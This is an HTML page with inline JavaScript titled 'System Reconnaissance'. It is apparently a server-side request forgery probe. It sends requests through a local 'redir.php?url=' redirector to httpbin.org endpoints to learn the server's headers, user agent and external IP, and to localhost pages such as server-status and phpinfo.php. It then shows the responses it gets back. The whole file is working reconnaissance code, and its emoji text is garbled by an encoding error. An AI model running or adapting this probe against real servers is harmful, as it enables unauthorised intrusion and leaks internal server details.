<!DOCTYPE html>
<html>
<head>
    <title>System Reconnaissance</title>
</head>
<body>
    <h1>üïµÔ∏è System Fingerprinting & Environment Detection</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Test 1: Gather server information via special endpoints
        var infoEndpoints = [
            'http://httpbin.org/headers',  // Baseline - see what headers the server sends
            'http://httpbin.org/user-agent', // Server's user agent
            'http://httpbin.org/ip',       // Server's external IP
            // Try to get server info pages
            'http://localhost/server-info',
            'http://localhost/server-status', 
            'http://localhost/info.php',
            'http://localhost/phpinfo.php',
            'http://localhost/test.php',
            // Environment detection
            'http://localhost/.well-known/security.txt',
            'http://localhost/robots.txt',
            'http://localhost/sitemap.xml'
        ];
        
        for(var i = 0; i < infoEndpoints.length; i++) {
            try {
                results += "<h3>üîç " + infoEndpoints[i] + "</h3>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + infoEndpoints[i], false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.length > 5) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>‚úÖ " + xhr.responseText.length + " bytes</div>";
                    results += "<div style='background:#f0f0f0;padding:10px;max-height:150px;overflow:scroll;font-size:10px;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 800) + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå No useful response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå " + e.message + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
